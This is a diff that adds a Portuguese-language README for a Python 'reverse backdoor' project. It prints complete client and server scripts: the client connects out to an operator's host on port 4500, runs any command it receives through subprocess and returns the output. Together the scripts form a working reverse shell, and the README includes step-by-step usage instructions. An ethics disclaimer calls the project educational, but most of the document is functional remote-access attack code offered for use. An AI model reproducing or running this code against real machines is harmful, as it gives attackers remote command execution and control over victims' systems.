@@ -1,0 +1,157 @@
+# Cliente-Servidor em Python
+
+Este projeto implementa um **backdoor reverso** básico em Python, onde o cliente se conecta ao servidor e permite a execução remota de comandos no sistema do cliente. Este README fornece uma explicação detalhada de ambos os scripts e instruções para uso.
+
+## **Scripts**
+
+### **1. Script Cliente (`client.py`)**
+
+#### **Função**
+O cliente conecta-se ao servidor, aguarda comandos, executa-os no sistema local e retorna os resultados.
+
+#### **Principais Componentes**
+- **Conexão com o servidor**: O cliente utiliza o endereço IP e a porta do servidor para se conectar.
+- **Execução de comandos**: Os comandos recebidos do servidor são executados localmente usando `subprocess`.
+- **Retorno de resultados**: O cliente envia a saída do comando executado e o diretório de trabalho atual de volta ao servidor.
+
+#### **Código Resumido**
+```python
+import socket
+import os
+import subprocess
+import sys
+
+SERVER_HOST = sys.argv[1]
+SERVER_PORT = 4500
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
+
+sockt_ = socket.socket()
+sockt_.connect((SERVER_HOST, SERVER_PORT))
+
+cwd = os.getcwd()
+sockt_.send(cwd.encode())
+
+while True:
+    command = sockt_.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        break
+    if splited_command[0].lower() == "cd":
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            output = ""
+    else:
+        output = subprocess.getoutput(command)
+    cwd = os.getcwd()
+    message = f"{output}{SEPARATOR}{cwd}"
+    sockt_.send(message.encode())
+
+sockt_.close()
+```
+
+---
+
+### **2. Script Servidor (`server.py`)**
+
+#### **Função**
+O servidor aceita conexões de clientes, envia comandos e recebe os resultados.
+
+#### **Principais Componentes**
+- **Escuta por conexões**: O servidor ouve na porta especificada para conexões de clientes.
+- **Envio de comandos**: Os comandos são digitados pelo operador e enviados ao cliente.
+- **Recebimento de resultados**: O servidor exibe a saída dos comandos e mantém o diretório de trabalho atualizado.
+
+#### **Código Resumido**
+```python
+import socket
+
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 4500
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
+
+sockt_ = socket.socket()
+sockt_.bind((SERVER_HOST, SERVER_PORT))
+sockt_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sockt_.listen(5)
+
+print(f"[!] LISTENING IN {SERVER_HOST}:{SERVER_PORT} [!]")
+
+client_socket, client_address = sockt_.accept()
+print(f"\n[!] {client_address[0]}:{client_address[1]} CONNNECTED")
+
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[#] YOU ARE HERE:", cwd)
+
+while True:
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        continue
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        break
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    results, cwd = output.split(SEPARATOR)
+    print(results)
+
+client_socket.close()
+sockt_.close()
+```
+
+---
+
+## **Funcionamento Geral**
+
+1. **Servidor**
+   - O servidor é iniciado e aguarda conexões de clientes.
+   - Após conectar, o servidor envia comandos para serem executados no cliente.
+
+2. **Cliente**
+   - O cliente conecta-se ao servidor e aguarda comandos.
+   - Executa os comandos recebidos e retorna a saída junto ao diretório de trabalho atual.
+
+3. **Comunicação**
+   - Ambos os scripts utilizam um `SEPARATOR` para separar a saída dos comandos e o diretório de trabalho atual.
+
+---
+
+## **Instruções de Uso**
+
+### **Executando o Servidor**
+1. Salve o script `server.py`.
+2. Execute-o em uma máquina ou servidor:
+   ```bash
+   python server.py
+   ```
+
+### **Executando o Cliente**
+1. Salve o script `client.py`.
+2. Execute-o em outra máquina, fornecendo o IP do servidor:
+   ```bash
+   python client.py <IP_DO_SERVIDOR>
+   ```
+
+### **Interagindo**
+- O servidor pode enviar qualquer comando shell ou terminal (como `ls`, `pwd`, `cd`, etc.).
+- Para encerrar a conexão, envie o comando `exit` no terminal do servidor.
+
+---
+
+## **Aviso Importante**
+- **Uso Ético**: Este projeto tem como objetivo educacional e de aprendizado. Não utilize este código para invadir, comprometer ou explorar sistemas sem autorização explícita. Tal uso é ilegal e antiético.
+- **Ambientes Controlados**: Execute este código apenas em ambientes controlados, como laboratórios próprios ou máquinas virtuais.
+
+---
+
+## **Recursos Úteis**
+- [Documentação do Python: socket](https://docs.python.org/3/library/socket.html)
+- [Uso de subprocess](https://docs.python.org/3/library/subprocess.html)
+
+---
+
+## **Licença**
+Este projeto é fornecido "como está", sem garantia de qualquer tipo. Use por sua conta e risco.
